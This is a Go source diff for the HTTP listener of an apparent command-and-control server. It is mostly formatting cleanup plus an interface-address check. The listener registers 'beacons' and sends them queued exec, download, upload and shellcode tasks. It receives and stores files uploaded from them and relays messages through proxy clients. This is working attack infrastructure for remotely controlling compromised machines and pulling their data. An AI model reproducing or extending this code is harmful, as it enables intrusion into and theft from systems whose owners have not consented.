@@ -1,25 +1,27 @@
-package main 
+package main
 
 import (
-	"io"
-	"os"
-	"fmt"
-	"log"
-	"time"
-	"mime"
 	"bytes"
-	"strings"
-	"strconv"
-	"net/http"
-	"io/ioutil"
-	"path/filepath"
+	b64 "encoding/base64"
 	"encoding/json"
- 	b64 "encoding/base64"
+	"fmt"
+	"io"
+	"io/ioutil"
+	"log"
+	"mime"
+	"net/http"
+	"os"
+	"path/filepath"
+	"regexp"
+	"strconv"
+	"strings"
+	"time"
+
 	"github.com/gorilla/mux"
 )
 
 type IHttpListener interface {
-	startListener() (error)
+	startListener() error
 	webInterfaceHandler(http.ResponseWriter, *http.Request)
 	receiveFile(*Beacon, http.ResponseWriter, *http.Request)
 	saveBeaconFile(*Beacon, bytes.Buffer, string)
@@ -29,47 +31,53 @@ type IHttpListener interface {
 }
 
 type HttpListener struct {
-	Iface string `json:"Interface"`
+	Iface    string `json:"Interface"`
 	Hostname string `json:"Hostname"`
-	Port int `json:"Port"`
+	Port     int    `json:"Port"`
 }
 
-func (server HttpListener) startListener() (error) {
+func (server HttpListener) startListener() error {
 	var router = mux.NewRouter()
-	var ifaceIp = getIfaceIp(server.Iface)
+	var ifaceIp = server.Iface
+
+	if !regexp.MustCompile(`(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}`).MatchString(*&server.Iface) {
+		getIfaceIp(server.Iface)
+	}
+
 	router.HandleFunc("/{data}", server.beaconPostHandler).Host(server.Hostname).Methods("Post")
 	router.HandleFunc("/{data}", server.beaconGetHandler).Host(server.Hostname).Methods("Get")
 	router.HandleFunc("/d/{data}", server.beaconUploadHandler).Host(server.Hostname).Methods("Get")
 
 	srv := &http.Server{
-        Handler:      router,
-        Addr:         ifaceIp + ":" + strconv.Itoa(server.Port),
-        WriteTimeout: 15 * time.Second,
-        ReadTimeout:  15 * time.Second,
-    }
+		Handler:      router,
+		Addr:         ifaceIp + ":" + strconv.Itoa(server.Port),
+		WriteTimeout: 15 * time.Second,
+		ReadTimeout:  15 * time.Second,
+	}
 
 	go func() {
-    	log.Fatal(srv.ListenAndServe())	
+		log.Fatal(srv.ListenAndServe())
+		fmt.Println("HTTPListener killed")
 	}()
 
 	return nil
 }
 
 func (server HttpListener) receiveFile(beacon *Beacon, w http.ResponseWriter, r *http.Request) {
-    r.ParseMultipartForm(32 << 20)
-    var buf bytes.Buffer
-    file, header, err := r.FormFile("file")
-	
-	if err != nil {
-        info("Failed to receive file.")
-		return
-    }
+	r.ParseMultipartForm(32 << 20)
+	var buf bytes.Buffer
+	file, header, err := r.FormFile("file")
 
-    defer file.Close()
-    name := strings.Split(header.Filename, "/")
-    io.Copy(&buf, file)
-    server.saveBeaconFile(beacon, buf, name[len(name)-1])
-    buf.Reset()
+	if err != nil {
+		info("Failed to receive file.")
+		return
+	}
+
+	defer file.Close()
+	name := strings.Split(header.Filename, "/")
+	io.Copy(&buf, file)
+	server.saveBeaconFile(beacon, buf, name[len(name)-1])
+	buf.Reset()
 }
 
 func (server HttpListener) saveBeaconFile(beacon *Beacon, data bytes.Buffer, name string) {
@@ -86,8 +94,8 @@ func (server HttpListener) saveBeaconFile(beacon *Beacon, data bytes.Buffer, nam
 		os.Mkdir(path, 0700)
 	}
 
-	err := ioutil.WriteFile(path + "/" + name, data.Bytes(), 0644)
-    if err != nil {
+	err := ioutil.WriteFile(path+"/"+name, data.Bytes(), 0644)
+	if err != nil {
 		info("Failed to save file.")
 	}
 
@@ -143,7 +151,7 @@ func (server HttpListener) beaconGetHandler(w http.ResponseWriter, r *http.Reque
 		respMap["proxyclients"] = beacon.ProxyClientBuffer
 
 		respData, _ := json.Marshal(respMap)
-		
+
 		beaconUpdates := []BeaconMessage{}
 
 		for _, client := range beacon.ProxyClients {
@@ -157,7 +165,7 @@ func (server HttpListener) beaconGetHandler(w http.ResponseWriter, r *http.Reque
 					clientRespMap["upload"] = b.UploadBuffer
 					clientRespMap["shellcode"] = b.ShellcodeBuffer
 					clientRespMap["proxyclients"] = b.ProxyClientBuffer
-				
+
 					b.ExecBuffer = nil
 					b.DownloadBuffer = nil
 					b.UploadBuffer = nil
@@ -166,26 +174,26 @@ func (server HttpListener) beaconGetHandler(w http.ResponseWriter, r *http.Reque
 
 					clientRespData, _ := json.Marshal(clientRespMap)
 
-					clientTargetMessage := BeaconMessage {
+					clientTargetMessage := BeaconMessage{
 						Route: []byte{0},
-						Data: clientRespData,
+						Data:  clientRespData,
 					}
 
 					clientTargetMessageEncoded, _ := json.Marshal(BeaconMessages{clientTargetMessage})
 
-					clientMessage := BeaconMessage {
+					clientMessage := BeaconMessage{
 						Route: []byte(b.Id),
-						Data: clientTargetMessageEncoded,
+						Data:  clientTargetMessageEncoded,
 					}
 
 					beaconUpdates = append(beaconUpdates, clientMessage)
 				}
-			}	
+			}
 		}
 
-		message := BeaconMessage {
-			Route: []byte{0},//[]byte(beacon.Ip), for forwarding
-			Data: respData,
+		message := BeaconMessage{
+			Route: []byte{0}, //[]byte(beacon.Ip), for forwarding
+			Data:  respData,
 		}
 		beaconUpdates = append(beaconUpdates, message)
 
@@ -205,10 +213,10 @@ func (server HttpListener) beaconGetHandler(w http.ResponseWriter, r *http.Reque
 				info("\n[+] Beacon " + update.Id + "@" + update.Ip + " " + update.Type + ":")
 				info("\t" + out[:len(out)-1])
 			} else if update.Type == "upload" {
-				if(decodedData[0] == '1') {
+				if decodedData[0] == '1' {
 					f := strings.Split(string(decodedData), ";")
 					info("Uploaded file to " + beacon.Id + "@" + beacon.Ip + ":" + f[1])
-				} else if(decodedData[0] == '0') {
+				} else if decodedData[0] == '0' {
 					info("Failed to upload file to " + beacon.Id + "@" + beacon.Ip)
 				}
 			} else if update.Type == "quit" {
@@ -249,7 +257,7 @@ func (server HttpListener) beaconGetHandler(w http.ResponseWriter, r *http.Reque
 			} else if update.Type == "proxyConnectSuccess" {
 				decoded, _ = b64.StdEncoding.DecodeString(update.Data)
 
-				for _, client := range beacon.ProxyClients{
+				for _, client := range beacon.ProxyClients {
 					if client == string(decoded) {
 						return
 					}
@@ -265,9 +273,9 @@ func (server HttpListener) beaconGetHandler(w http.ResponseWriter, r *http.Reque
 	}
 
 	messageData, _ := json.Marshal(beaconMessages)
-	fmt.Println(string(messageData))
+	//fmt.Println(string(messageData))
 	//messageEnc := securityContext.encrypt([]byte(messageData))
-	beaconMsg := b64.StdEncoding.EncodeToString(messageData)//(messageEnc)
+	beaconMsg := b64.StdEncoding.EncodeToString(messageData) //(messageEnc)
 
 	w.Write([]byte(beaconMsg))
 }
@@ -276,7 +284,7 @@ func (server HttpListener) beaconPostHandler(w http.ResponseWriter, r *http.Requ
 	var update CommandUpdate
 	data := mux.Vars(r)["data"]
 	decoded, _ := b64.StdEncoding.DecodeString(data)
-	
+
 	json.Unmarshal(decoded, &update)
 	beacon := registerBeacon(update)
 
@@ -285,6 +293,3 @@ func (server HttpListener) beaconPostHandler(w http.ResponseWriter, r *http.Requ
 		server.receiveFile(beacon, w, r)
 	}
 }
-
-
-
